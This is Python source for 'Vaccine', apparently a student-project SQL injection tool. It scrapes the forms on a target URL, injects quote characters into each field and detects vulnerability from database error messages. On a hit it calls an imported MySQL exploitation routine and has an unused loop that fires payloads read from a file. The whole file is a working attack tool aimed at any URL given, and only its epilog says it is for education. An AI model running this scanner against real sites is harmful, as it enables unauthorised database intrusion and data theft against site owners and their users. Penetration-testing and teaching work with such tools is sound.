import sys
import argparse
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from colorama import Fore, Style, init
from test_mysql import test_mysql


def make_request(url, method):
    response = None
    if method == "GET":
        response = requests.get(url)
    elif method == "POST":
        response = requests.post(url)
    return response


def extract_forms(url):
    try:
        response = requests.get(url)
    except Exception as e:
        print(f"Failed to connect to {url}. Error: {e}")
        return []
    if response.status_code == 404:
        print(f"Page not found: {url}")
        return []
    soup = BeautifulSoup(response.content, "html.parser")
    return soup.find_all("form")


def get_fields(form):
    form_data = {}
    try:
        form_data["action"] = form.attrs.get("action").lower()
    except:
        form_data["action"] = None
    form_data["method"] = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({
            "type": input_type,
            "name": input_name,
            "value": input_value
        })
    form_data["inputs"] = inputs
    print(f"inputs in form data: {inputs}")
    return form_data


def vulnerable(response):
    error_msgs = [
        "SQL syntax",
        "Warning",
        "mysql_",
        "ORA-",
        # MySql
        "You have an error in your SQL syntax",
        # Microsoft SQL server
        "Unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated",
        "Fatal error",
        "unterminated string constant",
        # PostgreSQL
        "syntax error",
        ]
    for msg in error_msgs:
        if msg.lower() in response.content.decode().lower():
            return True
    return False


def exploit_vulnerability(http_method, url, data, vulnerable_field, output_file):
    file = "syntax.txt"
    print(f"method: {http_method}")
    test_mysql(url, http_method, data, vulnerable_field, output_file)
    sys.exit(1)
    try:
        with open(file, 'r') as file:
            payloads = file.readlines()
    except FileNotFoundError:
        print(f"{Fore.RED}[-] Payload file not found: {file}{Style.RESET_ALL}")
        return
    for payload in payloads:
        payload = payload.strip()
        data[vulnerable_field] = payload
        print(f"[*] Testing payload: {payload}")
        if http_method == "post":
            response = requests.post(url, data=data)
        elif http_method == "get":
            response = requests.get(url, params=data)
        else:
            continue
        print(f"response is: {response.content.decode()}")


def scan_url(url, method, output_file):
    forms = extract_forms(url)
    for form in forms:
        form_data = get_fields(form)
        for i in ["'", '"']:
            for input_tag in form_data["inputs"]:
                if input_tag["type"] == "submit":
                    continue
                data = {}
                for tag in form_data["inputs"]:
                    if tag["type"] == "hidden" or tag["value"]:
                        data[tag["name"]] = tag["value"]
                    elif tag["type"] != "submit":
                        data[tag["name"]] = "test"
                if input_tag["name"]:
                    data[input_tag["name"]] = f"test{i}"
                action_url = (
                    urljoin(url, form_data["action"])
                    if form_data["action"] and form_data["action"] != "#" else url
                )
                print(f"Testing with URL: {url}, Data: {data}")
                if form_data["method"] == "post":
                    response = requests.post(action_url, data=data)
                elif form_data["method"] == "get":
                    response = requests.get(action_url, params=data)
                else:
                    continue
                if vulnerable(response):
                    print(f"{Fore.GREEN}[+] SQL Injection vulnerability found: {url}{Style.RESET_ALL}")
                    exploit_vulnerability(form_data["method"], action_url,
                                          data, input_tag["name"], output_file)
                    break
                else:
                    print(f"{Fore.RED}[-] No SQL Injection vulnerability found: {url}{Style.RESET_ALL}")
                    print(f"{Fore.BLUE}[*] Data: {data}{Style.RESET_ALL}")


if __name__ == "__main__":
    default_file = "data.txt"
    if len(sys.argv) < 2:
        print("Please provide a valid input.")
        print("./vaccine [-oX] URL")
        print(" -o: Output file name")
        print(" -X: Request method")
        sys.exit(1)
    parser = argparse.ArgumentParser(
            description="Vaccine SQL Injection Tool",
            epilog="Please use this tool for educational purposes only."
    )
    parser.add_argument(
            "-o", "--output",
            help="Output file name",
            default=default_file)
    parser.add_argument(
            "-X", "--method",
            help="Request method",
            default="GET")
    parser.add_argument(
            "url",
            help="Target URL")
    args = parser.parse_args()
    output_file = args.output
    method = args.method
    url = args.url
    init(autoreset=True)
    scan_url(url, method, output_file)
